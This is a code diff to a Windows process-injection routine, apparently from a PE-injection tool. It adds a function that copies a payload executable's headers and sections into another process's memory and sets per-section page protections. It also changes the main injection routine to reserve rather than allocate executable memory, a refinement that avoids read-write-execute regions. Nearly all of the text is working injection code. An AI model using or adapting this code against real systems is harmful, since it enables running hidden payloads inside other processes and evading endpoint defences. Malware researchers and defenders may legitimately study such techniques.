@@ -20,6 +20,74 @@ bool run_injected_in_new_thread(HANDLE hProcess, LPVOID remote_code_ep)
     return true;
 }
 
+bool paste_to_remote(HANDLE hProcess, LPVOID reservedAddress, LPVOID localCopyAddress, size_t payloadImageSize)
+{
+    size_t sec_number = get_sec_number((BYTE*) localCopyAddress);
+    LPVOID secptr = get_sec_ptr((BYTE*) localCopyAddress);
+    BOOL all_in_one = false;
+
+    if (sec_number == 0 || secptr == NULL || all_in_one) {
+        // the payload has no sections - this should not happen if you are injecting PE file
+        LPVOID remoteAddress = VirtualAllocEx(hProcess, reservedAddress , payloadImageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        if (remoteAddress == NULL) return false;
+
+        DWORD written = 0;
+        if (!WriteProcessMemory(hProcess, remoteAddress, localCopyAddress, payloadImageSize, &written) || written != payloadImageSize) {
+            printf("[ERROR] Could not paste the image into remote process!\n");
+            return false;
+        }
+        return true;
+    }
+
+    LPVOID startAddress = reservedAddress;
+    PIMAGE_SECTION_HEADER next_sec = (PIMAGE_SECTION_HEADER)(secptr);
+
+    DWORD written = 0;
+    DWORD old_protect = 0;
+    DWORD v_size = get_hdrs_size((BYTE*) localCopyAddress);
+
+    //copy headers:
+    LPVOID remoteAddress = VirtualAllocEx(hProcess, startAddress, v_size, MEM_COMMIT, PAGE_READWRITE);
+    if (remoteAddress == NULL) return false;
+    if (!WriteProcessMemory(hProcess, remoteAddress, localCopyAddress, v_size, &written) || written != v_size) {
+        printf("[ERROR] Could not paste the image into remote process at : %p\n", remoteAddress);
+        return false;
+    }
+    if (!VirtualProtectEx(hProcess, remoteAddress, v_size, PAGE_READONLY, &old_protect)) {
+        printf("[-] Protect failed: %p : %x\n", remoteAddress, PAGE_READONLY);
+        return false;
+    }
+
+    for (size_t i = 0; i < sec_number; i++) {
+        next_sec = (PIMAGE_SECTION_HEADER)((ULONGLONG)secptr + (IMAGE_SIZEOF_SECTION_HEADER * i));
+        if (!validate_ptr(localCopyAddress, payloadImageSize, next_sec, IMAGE_SIZEOF_SECTION_HEADER)) {
+            return false;
+        }
+        startAddress = (LPVOID)((ULONGLONG) reservedAddress + next_sec->VirtualAddress);
+        v_size = next_sec->Misc.VirtualSize;
+        //allocate a section:
+        LPVOID remoteAddress = VirtualAllocEx(hProcess, startAddress, v_size, MEM_COMMIT, PAGE_READWRITE);
+        if (remoteAddress == NULL) return false;
+
+        //set appropriate access rights:
+        LPVOID sec_address = (LPVOID)((ULONGLONG) localCopyAddress + next_sec->VirtualAddress);
+        if (!WriteProcessMemory(hProcess, remoteAddress, sec_address, v_size, &written) || written != v_size) {
+            printf("[ERROR] Could not paste the image into remote process at : %p\n", remoteAddress);
+            return false;
+        }
+
+        DWORD sec_protect = translate_protect(next_sec->Characteristics);
+        
+        if (!VirtualProtectEx(hProcess, remoteAddress, v_size, sec_protect, &old_protect)) {
+            printf("[-] Protect failed: %p : %x\n", remoteAddress, sec_protect);
+            return false;
+        }
+        printf("[+] Protect set: %p : %x\n", remoteAddress, sec_protect);
+        
+    }
+    return true;
+}
+
 bool inject_PE(HANDLE hProcess, BYTE* payload, SIZE_T payload_size)
 {
     if (!load_ntdll_functions()) return false;
@@ -49,7 +117,7 @@ bool inject_PE(HANDLE hProcess, BYTE* payload, SIZE_T payload_size)
     }
     SIZE_T written = 0;
 
-    LPVOID remoteAddress = VirtualAllocEx(hProcess, NULL, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID remoteAddress = VirtualAllocEx(hProcess, NULL, payloadImageSize, MEM_RESERVE, PAGE_READWRITE);
     if (remoteAddress == NULL)  {
         printf("Could not allocate memory in the remote process\n");
         return false;
@@ -89,7 +157,7 @@ bool inject_PE(HANDLE hProcess, BYTE* payload, SIZE_T payload_size)
     }
 
     // paste the local copy of the prepared image into the reserved space inside the remote process:
-    if (!WriteProcessMemory(hProcess, remoteAddress, localCopyAddress, payloadImageSize, &written) || written != payloadImageSize) {
+    if (!paste_to_remote(hProcess, remoteAddress, localCopyAddress, payloadImageSize)) {
         printf("[ERROR] Could not paste the image into remote process!\n");
         return false;
     }
